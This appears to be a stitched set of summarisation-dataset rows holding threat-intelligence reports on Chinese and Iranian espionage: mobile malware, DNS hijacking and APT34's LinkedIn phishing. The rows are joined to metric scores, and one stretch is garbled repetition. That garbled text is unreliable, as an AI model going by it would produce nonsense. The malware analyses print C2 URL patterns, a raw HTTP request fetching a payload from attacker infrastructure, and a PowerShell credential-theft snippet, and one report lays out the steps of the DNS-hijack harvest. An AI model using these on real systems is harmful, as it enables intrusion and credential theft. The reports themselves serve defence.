researchers found that the domestic/foreign intelligence crossover is not limited to the one example presented above. The connections between China's mobile attack campaigns aimed at specific targets of interest and traditional desktop campaigns aimed elsewhere go back to the earliest public security research detailing China's mobile surveillance.One report, published by Kaspersky Lab in March of 2013, was the first to document Android attacks against targets of interest. The attacks followed the compromise of an email account belonging to a high-profile target of interest. This email account was subsequently used to send spear-phishing emails to the target's contacts. One of the payloads sent in these emails was written for Android, and the subject of the email itself purported to be related to a high profile target of interest group (Baumartner, Raiu, & Maslennikov, 2013).The Android malware did not automatically send harvested information from infected phones, but instead waited until a specially crafted text message was received. Another piece of Android malware (known as an APK file), also identified by Kaspersky, referenced the disputed Senkaku Islands/ Diaoyu Islands in the East China Sea, which continue to be a geopolitical flashpoint between China and Japan to this day.In revisiting Kaspersky's early work, BlackBerry researchers were able to connect those earliest attacks to a threat group active today in targeted desktop attacks aimed at the Mongolian government. BlackBerry researchers refer to this group as BBCY-TA1. Kaspersky was the first to identify this group (which they called IRON HUSKY) a few years ago and documented prior desktop campaigns targeting the Mongolian government as well as the Russian government and military, but they appear not to have made the connection to the early mobile campaign against targets of interest, and indeed have only published limited information on IRON HUSKY since.Here is how BlackBerry researchers identified this new connection:Both of the Android backdoors mentioned in the 2013 Kaspersky report communicated with the IP address ""64.78.161[.]133,"" which was subsequently used by another malicious domain ""www.mol-government[.]com"" in July of 2014.This domain was linked to multiple China-affiliated attacks on the Mongolian government and the email address ""hlemonk@163[.]com"" (Fagerland, 2012).One of the domains associated with that email address has remained operationalized to this day and continues to be used in isolated, targeted attacks against the Mongolian government by BBCY-TA1.What's notable about this connection is that it suggests either that two Chinese APT groups with different targets and different missions are sharing infrastructure, or that a single APT group has expanded its targeting portfolio well beyond its initial scope. Both possibilities have implications which are addressed below.A Combined Threat: Example 3 - REAVERIn the month following the Kaspersky research on the mobile malware campaign, in April of 2013, Citizen Lab published research that showed a different mobile campaign had been deployed nearly five months prior, in December of 2012, focusing on targets of interest with trojanized Android applications. In this case, the attacker's use of command-and-control infrastructure was considerably more complex and used encoded web comments to issue commands to the infected devices.After further investigating the Citizen Lab report, BlackBerry researchers connected the 2012 mobile attacks on activists to several well-known, traditional desktop APT espionage groups including REAVER (aka SUTR), SCARLET MIMIC, and LOTUSBLOSSOM, whose tools notably do not typically include mobile malware. Instead, REAVER and LOTUSBLOSSOM are better known for Windows-based espionage campaigns linked to recent attacks on the automotive industry, the defense industry, the European Union, and the United Nations.BlackBerry researchers previously wrote about similar crossover with targets of interest (BlackBerry Threat Intelligence Team, 2019). BlackBerry researchers made the new connection as follows:The domain ""android.uyghur.dnsd[.]me"" first resolved to the IP address ""184.82.123[.]143"" nearly seven months prior in May of 2012 and changed to IP address ""216.176.190[.]44"" in September of 2012, which would strongly indicate that it was likely used before December.The domain ""internet.3-a[.]net"" also resolved to both IP addresses around the same timeframe and was later directly attributed to SUTR by Citizen Lab. In the same vein another dynamic DNS domain was also connected to this one ""ios.dnsd[.]info"" which would indicate that iOS devices were likely targeted around the same timeframe.Several other dynamic DNS domains linked to this early attack continued to resolve into the present and connect to REAVER/SUTR, SCARLET MIMIC, and even LOTUSBLOSSOM.This would again indicate either shared infrastructure among different APT groups with vastly different targeting priorities, which in the BlackBerry researcher's estimation is rare, or a single APT group with a wildly disparate target set over time, which would also be anomalous. Both possibilities present significant challenges to the conventional wisdom surrounding Chinese APT groups.China's Combined Threat: Example 4 - BBCY-TA2 and BBCY-TA3In retracing the history of the first publicly available reports on Chinese mobile malware campaigns, BlackBerry researchers found one campaign could be traced from the earliest reported activity straight through to the present day. It should come as no surprise that it was aimed at other political targets of interest making headlines. BlackBerry researchers observed a resurgence in the group's activity whenever domestic unrest began to arise in specific regions of the country.BlackBerry researchers dubbed this newly identified campaign OPERATION DUALCRYPTOEX. The researchers also identified new malware families that target both Android and Windows, which BlackBerry researchers dubbed PWNDROID3 and PWNWIN1, respectively. The effort is the work of a newly identified Chinese APT group BlackBerry researchers dubbed BBCY-TA2.BBCY-TA2's malware is distributed via mobile applications that mimic a popular peer-to-peer marketplace called ""localbitcoins[.]com"" designed to convert Bitcoin to cash at the regional level. China has seen a sharp rise in cryptocurrency adoption and demand following the ongoing unrest because certain targets of interest rely on Bitcoin for operational security and concerns over local currency instability. Numerous local retailers have begun to accept various cryptocurrencies while Bitcoin Cash is becoming a near de-facto standard among certain Chinese targets of interest (Redman, 2019), (Hamacher, 2019). But to be truly useful, crypto cash must often become hard cash in the local currency. And that is what sites like Local Bitcoins offer.BBCY-TA2 has taken note and taken advantage. The PWNDROID3 offered a wide range of capabilities including geolocation tracking, call monitoring, screen monitoring, and a host of other functions. Perhaps the most intriguing feature was a function that holds a list of specific locations or addresses and sends BBCY-TA2 geofencing alerts when they are visited. Here is a brief overview of the technical connections between BBCY-TA2 and the 2014 campaigns, as well as a quick tour of OPERATION DUALCRYPTOEX:The 2014 mobile campaigns, which came in September of that year, involved the ""Occupy Central with Love and Peace"" movement. Reporting at the time was often conflicting, however, given access to better data sources now, the majority of these mobile campaigns were all closely related and most likely deployed by the same set of operators, BBCY-TA2.The first campaign mimicked Code4HK, a group of developers. A message, ""Check out this Android app designed by Code4HK for the coordination of Occupy Central!"" was sent to a number of targets of interest and contained a trojan which communicated back to the domains ""www.xsser[.]com"" and ""mm.v1lady[.]com"" (Boehler & Sam, 2014). The Code4HK malware was also signed with the email address ""STREAM@V1LADY[.]COM"" on July 7, 2014.Shortly thereafter Lacoon Mobile Security (now Check Point) discovered what they called Xsser iOS mRAT (Bublil, Brodie, & Bashan, 2014). mRAT also communicated to ""www.xsser[.]com"" and was one of the first targeted iOS threats to be found in the wild. However, it would have only been able to infect already jailbroken devices. Conveniently, according to research at the time, roughly 14% of the nearly 60 million iOS devices in China had been jailbroken to support Chinese keyboard applications.The domain ""mm.v1lady[.]com"" resolved to ""112.124.47[.]157"" beginning on September 17, 2014. This IP would be a lynchpin for the group for nearly three years and link to both ""mm.bbmouseme[.]com"" and ""mm.outputinfo[.]com"". Lookout found the same operators had created a new Android RAT they termed xRAT in 2017 (Flossman, 2017), and newer undisclosed variants continue to infect users even in 2019.Regarding OPERATION DUALCRYPTOEX:""63c9a6108c056cfd3962c2608d262384d65ac199d5ec480f6e8779e470915df8"" is one recent sample signed on July 11, 2018 which communicates to BBCY-TA2's C2, ""huaian.bbmouseme[.]com"", and portends to be related to ""localbitcoins[.]com"".The sample utilized the ""javax.crypto.Cipher"" DES implementation to encode sensitive strings in the APK with the secret key ""i_want_you_and_i_need_you"". This key appears in some of BBCY-TA2's Windows backdoors as well. The author(s) may not have fully understood the mobile implementation, though, as only the first 8-bytes of the previous string would be used in the encryption and decryption process.OPERATION DUALCRYPTOEX marks the fourth example BlackBerry researchers identified in this report where there was established crossover in infrastructure with another APT group's activity. In this case BBCY-TA2's infrastructure crosses into the activity of another desktop-malware-focused APT group, though it too appears to be new. BlackBerry researchers have dubbed this newly identified yet traditional cyber espionage APT group BBCY-TA3.BlackBerry researchers observed this group most recently targeting telecommunications providers across the countries that ring the South China Sea for espionage purposes. In addition, BlackBerry researchers observed extensive campaigns throughout 2018 and 2019 in which BBCY-TA3 pursued nearly every major chemical manufacturing company in the world outside China, with particular interest in companies based in Germany, the U.S., and Canada.Conclusions on Chinese ActivityAfter an historic retrospective look at China's mobile surveillance, it is clear the majority of it was consistently domestic in focus. During this introspection BlackBerry researchers uncovered unexpected connections to a range of additional APT groups whose targets run the gamut of verticals from government to military to commercial, and which crisscross the globe.These connections are significant because they challenge an assessment some China analysts have made about the government's ability to integrate horizontally and coordinate across a vast bureaucracy rife with its own problems of dysfunction, corruption and stove-piping, as represented in the seminal Chinese Industrial Espionage (Hannas, Mulvenon, & Puglisi, 2013).If Chinese APT groups are coordinating efforts and/or sharing tools, they become more difficult to defend against. The shared tool sets also pose a challenge for organizations whose risk profile relies on blacklisting domains or looking only for certain types malware, and who might mistakenly allow access on the basis of the belief that they are outside of China's target profile.Our perception of the Chinese APT groups must expand to include both mobile and desktop threats, domestic and foreign organizations, and domestic/economic/government/military target profiles. It's also worth expanding our notion of the typical target of the Chinese government: malware meant for targets of interest in diaspora for domestic reasons may very well end up inside a Western business that proves an attractive target for someone else.IranIran's mobile surveillance capability has historically been primarily focused inward to target various people of interest to the Iranian government. While some of the first documented cases involved journalists and activists abroad, the motivation behind the attacks appeared to be domestically driven.The Iranian APT strategy for adoption of the mobile dimension is thus in line with that of the Chinese attack groups, whose earliest mobile campaigns were similarly motivated by an imperative to keep track of certain individuals both in and out of country who challenged the authority of the government.Domestic Kittens?Public research on Iranian mobile attacks was first published in 2016 and revealed a state-sponsored effort still in the initial stages of development, where threat actors deployed a relatively immature and simplistic toolset which included variants of ""DroidJack"" and Android Metasploit payloads (Guarnieri & Anderson, 2016). Following this early activity, it was clear the Iranian government took on significant development efforts, as revealed in the exposure of several subsequent and more sophisticated mobile campaigns such as Check Point's DOMESTIC KITTEN report last year (Check Point Research, 2018).In their report, Check Point detailed how a more advanced set of Android malware was quickly leveraged in a prolonged campaign of Iranian government espionage that was focused on Kurdish and Turkish natives, as well as ISIS supporters. At first glance this would suggest an outward-facing mobile espionage effort driven by counterterrorist and foreign policy concerns. None of that would be particularly surprising given that all these groups are in play in the Syrian conflict where Iran supports the Assad regime.However, Check Point assessed that the targets were in fact all Iranian citizens. What we still do not know, based on Check Point's analysis, is whether this domestic campaign was motivated by a larger, politically driven influence operation strategy as with the Chinese, or if it represents one facet of a larger political security strategy, or both. In a follow up post, Check Point added more insight and clarified that ""despite the heavy targeting of Iranians, there were also Kurdish and Urdu natives, ISIS supporters and even Yemeni citizens among the victim";of of the IT, of the IT, , , . of the reportable. . . .: ::.: [ense:. of the of the ides of the of the of the of the of the of the of the of the of the of the of the of the . . . in the 1..... are the ays of ays of the [ are [ays of ays of the ays of ays of the ays of the are, are, are, are, are, 2, 1...., 2, 2 of the 15 in the 4. [ides in the [ays of the [ of the of the of the of the of the of the of the of the of the of 2 of the 2 of the 2, 2 of the [ays, [ays, aps. of the [urs, of the 5 of the. in the 5 of the 4 of the of the of the of [ of the [ays of the [ of the [ of the of the of the of the of the of the of the of the of the of the of the [ides of the 4 of the of the of the of the of the of the of the of the of the of the of the to the to the........ in 30 in the 4 of 4 of the 100000000. [5. [ of the [ of the of the of the [ of the 4 of the [ of the [ of [ of [ of [ of [ of [ of [ of [ of [ of [ of [ of [ of [ of the of the of the of [ of [ of [ of [ of the of;en;{'r': 0.006191950464396285, 'p': 0.3333333333333333, 'f': 0.012158054353156393};{'r': 0.0010368066355624676, 'p': 0.05714285714285714, 'f': 0.0020366595277365885};{'r': 0.005572755417956657, 'p': 0.3, 'f': 0.010942248882031776}
https://www.mandiant.com/resources/blog/global-dns-hijacking-campaign-dns-record-manipulation-at-scale;Global DNS Hijacking Campaign: DNS Record Manipulation at Scale;IntroductionFireEye's Mandiant Incident Response and Intelligence teams have identified a wave of DNS hijacking that has affected dozens of domains belonging to government, telecommunications and internet infrastructure entities across the Middle East and North Africa, Europe and North America. While we do not currently link this activity to any tracked group, initial research suggests the actor or actors responsible have a nexus to Iran. This campaign has targeted victims across the globe on an almost unprecedented scale, with a high degree of success. We have been tracking this activity for several months, mapping and understanding the innovative tactics, techniques and procedures (TTPs) deployed by the attacker. We have also worked closely with victims, security organizations, and law enforcement agencies where possible to reduce the impact of the attacks and/or prevent further compromises.While this campaign employs some traditional tactics, it is differentiated from other Iranian activity we have seen by leveraging DNS hijacking at scale. The attacker uses this technique for their initial foothold, which can then be exploited in a variety of ways. In this blog post, we detail the three different ways we have seen DNS records be manipulated to enable victim compromises. Technique 1, involving the creation of a Let's Encrypt certificate and changing the A record, was previously documented by Cisco's TALOS team. The activity described in their blog post is a subset of the activity we have observed.Initial Research Suggests Iranian SponsorshipAttribution analysis for this activity is ongoing. While the DNS record manipulations described in this post are noteworthy and sophisticated, they may not be exclusive to a single threat actor as the activity spans disparate timeframes, infrastructure, and service providers.Multiple clusters of this activity have been active from January 2017 to January 2019.There are multiple, nonoverlapping clusters of actor-controlled domains and IPs used in this activity.A wide range of providers were chosen for encryption certificates and VPS hosts.Preliminary technical evidence allows us to assess with moderate confidence that this activity is conducted by persons based in Iran and that the activity aligns with Iranian government interests.FireEye Intelligence identified access from Iranian IPs to machines used to intercept, record and forward network traffic. While geolocation of an IP address is a weak indicator, these IP addresses were previously observed during the response to an intrusion attributed to Iranian cyber espionage actors.The entities targeted by this group include Middle Eastern governments whose confidential information would be of interest to the Iranian government and have relatively little financial value.DetailsThe following examples use victim[.]com to stand in for the victim domain, and private IP addresses to stand in for the actor controlled IP addresses.Technique 1 - DNS A RecordsThe first method exploited by the attacker is altering DNS A Records, as seen in Figure 1.Figure 1: DNS A RecordThe attacker logs into PXY1 , a Proxy box used to conduct non-attributed browsing and as a jumpbox to other infrastructure. The attacker logs into the DNS provider's administration panel, utilising previously compromised credentials. The A record (e.g. mail[.]victim[.]com ) is currently pointing to 192.168.100.100 . The attacker changes the A record and points it to 10.20.30.40 (OP1) . The attacker logs in from PXY1 to OP1 . A proxy is implemented to listen on all open ports, mirroring mail[.]victim[.]com .. A load balancer points to 192.168.100.100 [mail[.]victim[.]com] to pass through user traffic. certbot is used to create a Let's Encrypt certificate for mail[.]victim[.]com We have observed multiple Domain Control Validation providers being utilised as part of this campaign. A user now visits mail[.]victim[.]com and is directed to OP1. The Let's Encrypt certificate allows the browsers to establish a connection without any certificate errors as Let's Encrypt Authority X3 is trusted. The connection is forwarded to the load balancer which establishes the connection with the real mail[.]victim[.]com . The user is not aware of any changes and may only notice a slight delay. The username, password and domain credentials are harvested and stored.Technique 2 - DNS NS RecordsThe second method exploited by the attacker involved altering DNS NS Records, as seen in Figure 2.Figure 2: DNS NS RecordThe attacker again logs into PXY1 . This time, however, the attacker exploits a previously compromised registrar or ccTLD. The nameserver record ns1[.]victim[.]com is currently set to 192.168.100.200 . The attacker changes the NS record and points it to ns1[.]baddomain[.]com [10.1.2.3] . That nameserver will respond with the IP 10.20.30.40 (OP1) when mail[.]victim[.]com is requested, but with the original IP 192.168.100.100 if it is www[.]victim[.]com. The attacker logs in from PXY1 to OP1 . A proxy is implemented to listen on all open ports, mirroring mail[.]victim[.]com .. A load balancer points to 192.168.100.100 [mail[.]victim[.]com] to pass through user traffic. certbot is used to create a Let's Encrypt certificate for mail[.]victim[.]com . We have observed multiple Domain Control Validation providers being utilised during this campaign. A user visits mail[.]victim[.]com and is directed to OP1 . The Let's Encrypt certificate allows browsers to establish a connection without any certificate errors as Let's Encrypt Authority X3 is trusted. The connection is forwarded to the load balancer which establishes the connection with the real mail[.]victim[.]com . The user is not aware of any changes and may only notice a slight delay. The username, password and domain credentials are harvested and stored.Technique 3 - DNS RedirectorThe attacker has also been observed using a third technique in conjunction with either Figure 1 or Figure 2 above. This involves a DNS Redirector, as seen in Figure 3.Figure 3: DNS Operational boxThe DNS Redirector is an attacker operations box which responds to DNS requests.A DNS request for mail[.]victim[.]com is sent to OP2 (based on previously altered A Record or NS Record). If the domain is part of victim[.]com zone, OP2 responds with an attacker-controlled IP address, and the user is re-directed to the attacker-controlled infrastructure. If the domain is not part of the victim.com zone (e.g. google[.]com), OP2 makes a DNS request to a legitimate DNS to get the IP address and the legitimate IP address is returned to the user.TargetsA large number of organizations have been affected by this pattern of DNS record manipulation and fraudulent SSL certificates. They include telecoms and ISP providers, internet infrastructure providers, government and sensitive commercial entities.Root Cause Still Under InvestigationIt is difficult to identify a single intrusion vector for each record change, and it is possible that the actor, or actors are using multiple techniques to gain an initial foothold into each of the targets described above. FireEye intelligence customers have received previous reports describing sophisticated phishing attacks used by one actor that also conducts DNS record manipulation. Additionally, while the precise mechanism by which the DNS records were changed is unknown, we believe that at least some records were changed by compromising a victim's domain registrar account.Prevention TacticsThis type of attack is difficult to defend against, because valuable information can be stolen, even if an attacker is never able to get direct access to your organization's network. Some steps to harden your organization include:Implement multi-factor authentication on your domain's administration portal. Validate A and NS record changes. Search for SSL certificates related to your domain and revoke any malicious certificates. Validate the source IPs in OWA/Exchange logs. Conduct an internal investigation to assess if attackers gained access to your environment.ConclusionThis DNS hijacking, and the scale at which it has been exploited, showcases the continuing evolution in tactics from Iran-based actors. This is an overview of one set of TTPs that we recently observed affecting multiple entities. We are highlighting it now so that potential targets can take appropriate defensive action.;FireEye's Mandiant Incident Response and Intelligence teams have identified a wave of DNS hijacking that has affected dozens of domains belonging to government, telecommunications and internet infrastructure entities across the Middle East and North Africa, Europe and North America. While we do not currently link this activity to any tracked group, initial research suggests the actor or actors responsible have a nexus to Iran. This campaign has targeted victims across the globe on an almost unprecedented scale, with a high degree of success. We have been tracking this activity for several months, mapping and understanding the innovative tactics, techniques and procedures (TTPs) deployed by the attacker. We have also worked closely with victims, security organizations, and law enforcement agencies where possible to reduce the impact of the attacks and/or prevent further compromises.While this campaign employs some traditional tactics, it is differentiated from other Iranian activity we have seen by leveraging DNS hijacking at scale. The attacker uses this technique for their initial foothold, which can then be exploited in a variety of ways. In this blog post, we detail the three different ways we have seen DNS records be manipulated to enable victim compromises. Technique 1, involving the creation of a Let's Encrypt certificate and changing the A record, was previously documented by Cisco's TALOS team. The activity described in their blog post is a subset of the activity we have observed.Initial Research Suggests Iranian SponsorshipAttribution analysis for this activity is ongoing. While the DNS record manipulations described in this post are noteworthy and sophisticated, they may not be exclusive to a single threat actor as the activity spans disparate timeframes, infrastructure, and service providers.Multiple clusters of this activity have been active from;en;{'r': 0.3546511627906977, 'p': 0.9945652173913043, 'f': 0.5228571389818776};{'r': 0.26607319485657766, 'p': 0.9962962962962963, 'f': 0.4199843838705491};{'r': 0.3546511627906977, 'p': 0.9945652173913043, 'f': 0.5228571389818776}
https://www.mandiant.com/resources/blog/hard-pass-declining-apt34-invite-to-join-their-professional-network;Hard Pass: Declining APT34’s Invite to Join Their Professional Network;"BackgroundWith increasing geopolitical tensions in the Middle East, we expect Iran to significantly increase the volume and scope of its cyber espionage campaigns. Iran has a critical need for strategic intelligence and is likely to fill this gap by conducting espionage against decision makers and key organizations that may have information that furthers Iran's economic and national security goals. The identification of new malware and the creation of additional infrastructure to enable such campaigns highlights the increased tempo of these operations in support of Iranian interests.FireEye Identifies Phishing CampaignIn late June 2019, FireEye identified a phishing campaign conducted by APT34, an Iranian-nexus threat actor. Three key attributes caught our eye with this particular campaign:Masquerading as a member of Cambridge University to gain victims' trust to open malicious documents, The usage of LinkedIn to deliver malicious documents, The addition of three new malware families to APT34's arsenal.FireEye's platform successfully thwarted this attempted intrusion, stopping a new malware variant dead in its tracks. Additionally, with the assistance of our FireEye Labs Advanced Reverse Engineering (FLARE), Intelligence, and Advanced Practices teams, we identified three new malware families and a reappearance of PICKPOCKET, malware exclusively observed in use by APT34. The new malware families, which we will examine later in this post, show APT34 relying on their PowerShell development capabilities, as well as trying their hand at Golang.APT34 is an Iran-nexus cluster of cyber espionage activity that has been active since at least 2014. They use a mix of public and non-public tools to collect strategic information that would benefit nation-state interests pertaining to geopolitical and economic needs. APT34 aligns with elements of activity reported as OilRig and Greenbug, by various security researchers. This threat group has conducted broad targeting across a variety of industries operating in the Middle East, however, we believe APT34's strongest interest is gaining access to financial, energy, and government entities.Additional research on APT34 can be found in this FireEye blog post, this CERT-OPMD post, and this Cisco post.Mandiant Managed Defense also initiated a Community Protection Event (CPE) titled ""Geopolitical Spotlight: Iran."" This CPE was created to ensure our customers are updated with new discoveries, activity and detection efforts related to this campaign, along with other recent activity from Iranian-nexus threat actors to include APT33, which is mentioned in this updated FireEye blog post.Industries TargetedThe activities observed by Managed Defense, and described in this post, were primarily targeting the following industries:Energy and UtilitiesGovernmentOil and GasUtilizing Cambridge University to Establish TrustOn June 19, 2019, Mandiant Managed Defense Security Operations Center received an exploit detection alert on one of our FireEye Endpoint Security appliances. The offending application was identified as Microsoft Excel and was stopped immediately by FireEye Endpoint Security's ExploitGuard engine. ExploitGuard is our behavioral monitoring, detection, and prevention capability that monitors application behavior, looking for various anomalies that threat actors use to subvert traditional detection mechanisms. Offending applications can subsequently be sandboxed or terminated, preventing an exploit from reaching its next programmed step.The Managed Defense SOC analyzed the alert and identified a malicious file named System.doc (MD5: b338baa673ac007d7af54075ea69660b), located in C:\Users\<user_name>\.templates. The file System.doc is a Windows Portable Executable (PE), despite having a ""doc"" file extension. FireEye identified this new malware family as TONEDEAF.A backdoor that communicates with a single command and control (C2) server using HTTP GET and POST requests, TONEDEAF supports collecting system information, uploading and downloading of files, and arbitrary shell command execution. When executed, this variant of TONEDEAF wrote encrypted data to two temporary files - temp.txt and temp2.txt - within the same directory of its execution. We explore additional technical details of TONEDEAF in the malware appendix of this post.Retracing the steps preceding exploit detection, FireEye identified that System.doc was dropped by a file named ERFT-Details.xls. Combining endpoint- and network-visibility, we were able to correlate that ERFT-Details.xls originated from the URL http://www.cam-research-ac[.]com/Documents/ERFT-Details.xls. Network evidence also showed the access of a LinkedIn message directly preceding the spreadsheet download.Managed Defense reached out to the impacted customer's security team, who confirmed the file was received via a LinkedIn message. The targeted employee conversed with ""Rebecca Watts"", allegedly employed as ""Research Staff at University of Cambridge"". The conversation with Ms. Watts, provided in Figure 1, began with the solicitation of resumes for potential job opportunities.Figure 1: Screenshot of LinkedIn message asking to download TONEDEAFThis is not the first time we've seen APT34 utilize academia and/or job offer conversations in their various campaigns. These conversations often take place on social media platforms, which can be an effective delivery mechanism if a targeted organization is focusing heavily on e-mail defenses to prevent intrusions.FireEye examined the original file ERFT-Details.xls, which was observed with at least two unique MD5 file hashes:96feed478c347d4b95a8224de26a1b2ccaf418cbf6a9c4e93e79d4714d5d3b87A snippet of the VBA code, provided in Figure 2, creates System.doc in the target directory from base64-encoded text upon opening.Figure 2: Screenshot of VBA code from System.docThe spreadsheet also creates a scheduled task named ""windows update check"" that runs the file C:\Users\<user_name>\.templates\System Manager.exe every minute. Upon closing the spreadsheet, a final VBA function will rename System.doc to System Manager.exe. Figure 3 provides a snippet of VBA code that creates the scheduled task, clearly obfuscated to avoid simple detection.Figure 3: Additional VBA code from System.docUpon first execution of TONEDEAF, FireEye identified a callback to the C2 server offlineearthquake[.]com over port 80.The FireEye Footprint: Pivots and Victim IdentificationAfter identifying the usage of offlineearthquake[.]com as a potential C2 domain, FireEye's Intelligence and Advanced Practices teams performed a wider search across our global visibility. FireEye's Advanced Practices and Intelligence teams were able to identify additional artifacts and activity from the APT34 actors at other victim organizations. Of note, FireEye discovered two additional new malware families hosted at this domain, VALUEVAULT and LONGWATCH. We also identified a variant of PICKPOCKET, a browser credential-theft tool FireEye has been tracking since May 2018, hosted on the C2.Requests to the domain offlineearthquake[.]com could take multiple forms, depending on the malware's stage of installation and purpose. Additionally, during installation, the malware retrieves the system and current user names, which are used to create a three-character ""sys_id"". This value is used in subsequent requests, likely to track infected target activity. URLs were observed with the following structures:hxxp[://]offlineearthquake[.]com/download?id=<sys_id>&n=000hxxp[://]offlineearthquake[.]com/upload?id=<sys_id>&n=000hxxp[://]offlineearthquake[.]com/file/<sys_id>/<executable>?id=<cmd_id>&h=000hxxp[://]offlineearthquake[.]com/file/<sys_id>/<executable>?id=<cmd_id>&n=000The first executable identified by FireEye on the C2 was WinNTProgram.exe (MD5: 021a0f57fe09116a43c27e5133a57a0a), identified by FireEye as LONGWATCH. LONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the Window's temp folder. Further information regarding LONGWATCH is detailed in the Malware Appendix section at the end of the post.FireEye Network Security appliances also detected the following being retrieved from APT34 infrastructure (Figure 4).GET hxxp://offlineearthquake.com/file/<sys_id>/b.exe?id=<3char_redacted>&n=000User-Agent: Mozilla/5.0 (Windows NT 6.1, Trident/7.0, rv:11.0)AppleWebKit/537.36 (KHTML, like Gecko)Host: offlineearthquake[.]comProxy-Connection: Keep-Alive Pragma: no-cache HTTP/1.1Figure 4: Snippet of HTTP traffic retrieving VALUEVAULT, detected by FireEye Network Security applianceFireEye identifies b.exe (MD5: 9fff498b78d9498b33e08b892148135f) as VALUEVAULT.VALUEVAULT is a Golang compiled version of the ""Windows Vault Password Dumper"" browser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel.VALUEVAULT maintains the same functionality as the original tool by allowing the operator to extract and view the credentials stored in the Windows Vault. Additionally, VALUEVAULT will call Windows PowerShell to extract browser history in order to match browser passwords with visited sites. Further information regarding VALUEVAULT can be found in the appendix below.Further pivoting from FireEye appliances and internal data sources yielded two additional files, PE86.dll (MD5: d8abe843db508048b4d4db748f92a103) and PE64.dll (MD5: 6eca9c2b7cf12c247032aae28419319e). These files were analyzed and determined to be 64- and 32-bit variants of the malware PICKPOCKET, respectively.PICKPOCKET is a credential theft tool that dumps the user's website login credentials from Chrome, Firefox, and Internet Explorer to a file. This tool was previously observed during a Mandiant incident response in 2018 and, to date, solely utilized by APT34.ConclusionThe activity described in this blog post presented a well-known Iranian threat actor utilizing their tried-and-true techniques to breach targeted organizations. Luckily, with FireEye's platform in place, our Managed Defense customers were not impacted. Furthermore, upon the blocking of this activity, FireEye was able to expand upon the observed indicators to identify a broader campaign, as well as the use of new and old malware.We suspect this will not be the last time APT34 brings new tools to the table. Threat actors are often reshaping their TTPs to evade detection mechanisms, especially if the target is highly desired. For these reasons, we recommend organizations remain vigilant in their defenses, and remember to view their environment holistically when it comes to information security.Learn more about Mandiant Managed Defense, and catch an on-demand recap on this and the Top 5 Managed Defense attacks this year.Malware AppendixTONEDEAFTONEDEAF is a backdoor that communicates with Command and Control servers using HTTP or DNS. Supported commands include system information collection, file upload, file download, and arbitrary shell command execution. Although this backdoor was coded to be able to communicate with DNS requests to the hard-coded Command and Control server, c[.]cdn-edge-akamai[.]com, it was not configured to use this functionality. Figure 5 provides a snippet of the assembly CALL instruction of dns_exfil. The creator likely made this as a means for future DNS exfiltration as a plan B.Figure 5: Snippet of code from TONEDEAF binaryAside from not being enabled in this sample, the DNS tunneling functionality also contains missing values and bugs that prevent it from executing properly. One such bug involves determining the length of a command response string without accounting for Unicode strings. As a result, a single command response byte is sent when, for example, the malware executes a shell command that returns Unicode output. Additionally, within the malware, an unused string contained the address 185[.]15[.]247[.]154.VALUEVAULTVALUEVAULT is a Golang compiled version of the ""Windows Vault Password Dumper"" browser credential theft tool from Massimiliano Montoro, the developer of Cain & Abel.VALUEVAULT maintains the same functionality as the original tool by allowing the operator to extract and view the credentials stored in the Windows Vault. Additionally, VALUEVAULT will call Windows PowerShell to extract browser history in order to match browser passwords with visited sites. A snippet of this function is shown in Figure 6.powershell.exe /c ""function get-iehistory {. [CmdletBinding()]. param (). . $shell = New-Object -ComObject Shell.Application. $hist = $shell.NameSpace(34). $folder = $hist.Self. . $hist.Items() | . foreach {. if ($_.IsFolder) {. $siteFolder = $_.GetFolder. $siteFolder.Items() | . foreach {. $site = $_. . if ($site.IsFolder) {. $pageFolder = $site.GetFolder. $pageFolder.Items() | . foreach {. $visit = New-Object -TypeName PSObject -Property @{ . URL = $($pageFolder.GetDetailsOf($_,0)) . }. $visit. }. }. }. }. }. }. get-iehistoryFigure 6: Snippet of PowerShell code from VALUEVAULT to extract browser credentialsUpon execution, VALUEVAULT creates a SQLITE database file in the AppData\Roaming directory under the context of the user account it was executed by. This file is named fsociety.dat and VALUEVAULT will write the dumped passwords to this in SQL format. This functionality is not in the original version of the ""Windows Vault Password Dumper"". Figure 7 shows the SQL format of the fsociety.dat file.Figure 7: SQL format of the VALUEVAULT fsociety.dat SQLite databaseVALUEVAULT's function names are not obfuscated and are directly reviewable in strings analysis. Other developer environment variables were directly available within the binary as shown below. VALUEVAULT does not possess the ability to perform network communication, meaning the operators would need to manually retrieve the captured output of the tool.C:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/new_edge.goC:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/mozila.goC:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/main.goC:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/ie.goC:/Users/<redacted>/Desktop/projects/go/src/browsers-password-cracker/Chrome Password Recovery.goFigure 8: Golang files extracted during execution of VALUEVAULTLONGWATCHFireEye identified the binary WinNTProgram.exe (MD5:021a0f57fe09116a43c27e5133a57a0a) hosted on the malicious domain offlineearthquake[.]com. FireEye identifies this malware as LONGWATCH. The primary function of LONGWATCH is a keylogger that outputs keystrokes to a log.txt file in the Windows temp folder.Interesting strings identified in the binary are shown in Figure 9.GetAsyncKeyState>---------------------------------------------------c:\\windows\\temp\\log.txt[ENTER][CapsLock][CRTL][PAGE_UP][PAGE_DOWN][HOME][LEFT][RIGHT][DOWN][PRINT][PRINT SCREEN] (1 space)[INSERT][SLEEP][PAUSE]---------------CLIPBOARD------------>>> (2 spaces)c:\\windows\\temp\\log.txtFigure 9: Strings identified in a LONGWATCH binaryDetecting the TechniquesFireEye detects this activity across our platforms, including named detection for TONEDEAF, VALUEVAULT, and LONGWATCH. Table 2 contains several specific detection names that provide an indication of APT34 activity.Signature Name FE_APT_Keylogger_Win_LONGWATCH_1 FE_APT_Keylogger_Win_LONGWATCH_2 FE_APT_Keylogger_Win32_LONGWATCH_1 FE_APT_HackTool_Win_PICKPOCKET_1 FE_APT_Trojan_Win32_VALUEVAULT_1 FE_APT_Backdoor_Win32_TONEDEAF TONEDEAF BACKDOOR [DNS] TONEDEAF BACKDOOR [upload] TONEDEAF BACKDOOR [URI]Table 1: FireEye Platform DetectionsEndpoint IndicatorsIndicator MD5 Hash (if applicable) Code Family System.doc b338baa673ac007d7af54075ea69660b TONEDEAF 50fb09d53c856dcd0782e1470eaeae35 TONEDEAF ERFT-Details.xls 96feed478c347d4b95a8224de26a1b2c TONEDEAF DROPPER caf418cbf6a9c4e93e79d4714d5d3b87 TONEDEAF DROPPER b.exe 9fff498b78d9498b33e08b892148135f 